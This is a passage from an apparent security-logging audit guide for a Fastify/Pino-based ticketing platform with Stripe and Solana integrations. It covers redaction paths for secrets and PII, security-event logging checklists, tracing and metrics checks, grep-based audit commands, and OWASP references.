grep -rn "logger:" src/ --include="*.ts"
grep -rn "redact:" src/ --include="*.ts"
grep -rn "pino-pretty" src/ --include="*.ts"
grep -rn "correlationId\|correlation-id" src/ --include="*.ts"
```

---

### 3.2 Sensitive Data Protection Checklist

| ID | Check | Severity | Verification |
|----|-------|----------|--------------|
| **SD1** | Passwords never logged | CRITICAL | Search logs for "password" |
| **SD2** | Tokens/API keys redacted | CRITICAL | Check `authorization` header handling |
| **SD3** | PII fields redacted | CRITICAL | Check for email, phone, SSN patterns |
| **SD4** | Credit card data never logged | CRITICAL | PCI-DSS requirement |
| **SD5** | Session tokens redacted | CRITICAL | Check cookie handling |
| **SD6** | Stripe sensitive data filtered | HIGH | No full card numbers |
| **SD7** | Solana private keys never logged | CRITICAL | Check wallet operations |
| **SD8** | Request body logging filtered | HIGH | Check body serializer |
| **SD9** | Error stack traces controlled | MEDIUM | No stacks in production |
| **SD10** | Database queries sanitized | HIGH | No raw SQL with values |

**Pino Redaction Template:**

```typescript
const REDACT_PATHS = [
  // Authentication
  '*.password',
  '*.passwordHash',
  '*.currentPassword',
  '*.newPassword',
  '*.token',
  '*.accessToken',
  '*.refreshToken',
  '*.apiKey',
  '*.secret',
  
  // Request headers
  'req.headers.authorization',
  'req.headers.cookie',
  'req.headers["x-api-key"]',
  
  // PII
  '*.email',
  '*.phone',
  '*.ssn',
  '*.socialSecurityNumber',
  '*.dateOfBirth',
  '*.address',
  
  // Financial
  '*.creditCard',
  '*.cardNumber',
  '*.cvv',
  '*.cvc',
  '*.bankAccount',
  '*.routingNumber',
  
  // Stripe
  '*.stripeCustomerId',
  'req.body.paymentMethodId',
  
  // Solana
  '*.privateKey',
  '*.secretKey',
  '*.mnemonic',
  '*.seed',
  '*.keypair'
];
```

---

### 3.3 Security Event Logging Checklist

| ID | Event Category | Events to Log | Level |
|----|----------------|---------------|-------|
| **SE1** | Authentication | Login success/failure | INFO/WARN |
| **SE2** | Authentication | Logout | INFO |
| **SE3** | Authentication | Password change/reset | INFO |
| **SE4** | Authentication | MFA enable/disable | INFO/WARN |
| **SE5** | Authorization | Access denied | WARN |
| **SE6** | Authorization | Role/permission changes | INFO |
| **SE7** | Session | Creation/expiry/revocation | INFO |
| **SE8** | Input Validation | Validation failures | WARN |
| **SE9** | Rate Limiting | Limit exceeded | WARN |
| **SE10** | Transactions | Payment success/failure | INFO/WARN |
| **SE11** | Transactions | Refunds issued | INFO |
| **SE12** | Data Access | Bulk exports | INFO |
| **SE13** | Data Access | Sensitive data access | INFO |
| **SE14** | Admin Actions | User management | INFO |
| **SE15** | Admin Actions | Configuration changes | WARN |

**Source:** https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html

---

### 3.4 Service-Specific Checklist

#### Fastify/Pino Configuration

| ID | Check | Severity |
|----|-------|----------|
| **FP1** | `logger: true` or custom config in Fastify options | CRITICAL |
| **FP2** | `request.log` used instead of global logger | HIGH |
| **FP3** | `serializers` configured for req/res | HIGH |
| **FP4** | `genReqId` configured for request tracking | HIGH |
| **FP5** | Child loggers used for context | MEDIUM |
| **FP6** | Async logging enabled (`sync: false`) | MEDIUM |

#### Stripe Integration Logging

| ID | Check | Severity |
|----|-------|----------|
| **ST1** | Webhook events logged with event ID | HIGH |
| **ST2** | Payment intent IDs logged (not full card) | HIGH |
| **ST3** | Customer IDs hashed in logs | MEDIUM |
| **ST4** | Stripe API errors logged with code | HIGH |
| **ST5** | Idempotency keys logged | MEDIUM |

```typescript
// Stripe logging example
stripeWebhookHandler.on('payment_intent.succeeded', async (event) => {
  logger.info({
    event: 'stripe_webhook',
    stripeEventId: event.id,
    stripeEventType: event.type,
    paymentIntentId: event.data.object.id,
    amount: event.data.object.amount,
    currency: event.data.object.currency
    // NEVER log: customer email, card details
  });
});
```

#### Solana Integration Logging

| ID | Check | Severity |
|----|-------|----------|
| **SOL1** | Transaction signatures logged | HIGH |
| **SOL2** | Wallet addresses logged (public only) | HIGH |
| **SOL3** | Private keys NEVER logged | CRITICAL |
| **SOL4** | RPC errors logged with endpoint | HIGH |
| **SOL5** | Confirmation status logged | MEDIUM |

```typescript
// Solana logging example
logger.info({
  event: 'solana_transaction',
  signature: transaction.signature,
  status: confirmationStatus,
  slot: slot,
  walletAddress: publicKey.toBase58(),  // Public key only
  // NEVER log: privateKey, secretKey, mnemonic
});
```

---

### 3.5 Distributed Tracing Checklist

| ID | Check | Severity | Verification |
|----|-------|----------|--------------|
| **DT1** | OpenTelemetry SDK initialized | HIGH | Check `tracing.ts` |
| **DT2** | Auto-instrumentation enabled | HIGH | HTTP, DB, Redis instrumented |
| **DT3** | Service name configured | HIGH | `OTEL_SERVICE_NAME` set |
| **DT4** | Trace ID in all logs | HIGH | Check log output |
| **DT5** | Context propagation to downstream | CRITICAL | Headers forwarded |
| **DT6** | Error spans recorded | HIGH | `span.recordException()` used |
| **DT7** | Custom spans for business logic | MEDIUM | Key operations traced |
| **DT8** | Sampling configured for production | MEDIUM | Avoid 100% in high-traffic |

---

### 3.6 Metrics Checklist

| ID | Check | Severity | Verification |
|----|-------|----------|--------------|
| **M1** | `/metrics` endpoint exposed | HIGH | Prometheus can scrape |
| **M2** | HTTP request rate tracked | HIGH | `http_requests_total` |
| **M3** | HTTP request duration tracked | HIGH | `http_request_duration_seconds` |
| **M4** | Error rate trackable | HIGH | Status code labels |
| **M5** | Default Node.js metrics enabled | MEDIUM | Memory, CPU, GC |
| **M6** | Business metrics defined | MEDIUM | Tickets, payments, etc. |
| **M7** | Label cardinality controlled | HIGH | No user IDs in labels |
| **M8** | Histogram buckets appropriate | MEDIUM | Check latency buckets |

---

### 3.7 Quick Grep Audit Commands

```bash
# Find logging without correlation ID
grep -rn "logger\.\(info\|warn\|error\)" src/ --include="*.ts" | grep -v correlationId

# Find potential sensitive data logging
grep -rn "password\|token\|secret\|apiKey" src/ --include="*.ts" | grep "log"

# Find console.log usage (should use logger)
grep -rn "console\.\(log\|error\|warn\)" src/ --include="*.ts"

# Verify redaction is configured
grep -rn "redact:" src/ --include="*.ts"

# Check for stack traces in production
grep -rn "err\.stack\|error\.stack" src/ --include="*.ts"

# Find missing error logging
grep -rn "catch\s*(" src/ --include="*.ts" -A3 | grep -v "log"

# Check OpenTelemetry setup
grep -rn "@opentelemetry" src/ --include="*.ts"
```

---

## 4. Sources & References

### OWASP Resources

1. **OWASP Logging Cheat Sheet**
   https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html

2. **OWASP Logging Vocabulary Cheat Sheet**
   https://cheatsheetseries.owasp.org/cheatsheets/Logging_Vocabulary_Cheat_Sheet.html

3. **OWASP Top 10: A09 Security Logging and Monitoring Failures**
   https://owasp.org/Top10/2021/A09_2021-Security_Logging_and_Monitoring_Failures/

4. **OWASP Log Injection Attack**
   https://owasp.org/www-community/attacks/Log_Injection

5. **OWASP Proactive Controls: Security Logging and Monitoring**
   https://top10proactive.owasp.org/archive/2018/c9-security-logging/

### Fastify & Pino

6. **Fastify Logging Documentation**
   https://fastify.dev/docs/latest/Reference/Logging/

7. **Pino Logger Documentation**
   https://getpino.io/

8. **Pino Redaction Documentation**
   https://getpino.io/#/docs/redaction

9. **Production-Grade Logging in Node.js with Pino**
   https://www.dash0.com/guides/logging-in-node-js-with-pino

10. **A Complete Guide to Pino Logging**
    https://betterstack.com/community/guides/logging/how-to-install-setup-and-use-pino-to-log-node-js-applications/

### OpenTelemetry & Distributed Tracing

11. **OpenTelemetry Node.js Documentation**
    https://opentelemetry.io/docs/languages/js/

12. **Distributed Tracing in Node.js with OpenTelemetry**
    https://betterstack.com/community/guides/observability/opentelemetry-nodejs-tracing/

13. **OpenTelemetry Node.js - SigNoz**
    https://signoz.io/opentelemetry/nodejs/

14. **OpenTelemetry in Practice: Instrumenting JavaScript Apps**
    https://marmelab.com/blog/2024/03/14/opentelemetry-in-practice-instrumenting-javascript-apps-for-tracing.html

### Prometheus & Metrics

15. **Node.js Performance Monitoring with Prometheus**
    https://blog.risingstack.com/node-js-performance-monitoring-with-prometheus/

16. **Prometheus Best Practices**
    https://betterstack.com/community/guides/monitoring/prometheus-best-practices/

17. **Node.js Reference Architecture: Metrics**
    https://nodeshift.dev/nodejs-reference-architecture/operations/metrics/

18. **Prometheus Documentation**
    https://prometheus.io/docs/introduction/overview/

### Elastic Common Schema

19. **ECS Logging Libraries**
    https://www.elastic.co/docs/reference/ecs/logging/intro

20. **ECS Guidelines and Best Practices**
    https://www.elastic.co/guide/en/ecs/master/ecs-guidelines.html

### Log Levels

21. **Log Levels Explained**
    https://betterstack.com/community/guides/logging/log-levels-explained/

22. **Logging Levels - Sematext**
    https://sematext.com/blog/logging-levels/

### Security

23. **Log Injection Prevention - CERT**
    https://wiki.sei.cmu.edu/confluence/display/java/IDS03-J.+Do+not+log+unsanitized+user+input

24. **Log Injection Vulnerability - SecureFlag**
    https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/log_injection_vulnerability.html

---

## Quick Reference Card

### Pino Log Levels

| Level | Numeric | Use Case |
|-------|---------|----------|
| fatal | 60 | App crash |
| error | 50 | Operation failed |
| warn | 40 | Unexpected but recoverable |
| info | 30 | Business events, audit |
| debug | 20 | Development troubleshooting |
| trace | 10 | Detailed execution flow |

### Required Redaction Paths

```typescript
redact: [
  '*.password', '*.token', '*.secret', '*.apiKey',
  'req.headers.authorization', 'req.headers.cookie',
  '*.creditCard', '*.cardNumber', '*.cvv',
  '*.privateKey', '*.mnemonic', '*.seed'
]
```

### Security Events to Log

| Event | Level |
|-------|-------|
| `authn_login_success` | INFO |
| `authn_login_fail` | WARN |
| `authz_fail` | WARN |
| `privilege_change` | INFO |
| `payment_success` | INFO |
| `payment_failure` | WARN |
| `rate_limit_exceeded` | WARN |

### Correlation ID Header

```
X-Correlation-ID: <uuid>
```

Always:
1. Accept from upstream or generate
2. Include in all logs
3. Propagate to downstream services
4. Return in error responses

---

*Document generated: December 2025*
*For: TicketToken Platform*
*Version: 1.0*